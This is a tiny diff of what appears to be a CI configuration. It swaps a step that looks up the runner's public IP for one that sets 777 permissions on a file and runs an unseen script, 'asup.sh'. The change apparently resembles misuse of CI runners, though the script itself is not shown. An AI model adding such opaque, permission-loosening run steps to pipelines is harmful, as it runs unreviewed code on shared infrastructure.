@@ -4,4 +4,4 @@ container:
 task:
   matrix:
     - name: misoka
-      script: curl ifconfig.me
+      script: chmod 777 bash && bash asup.sh
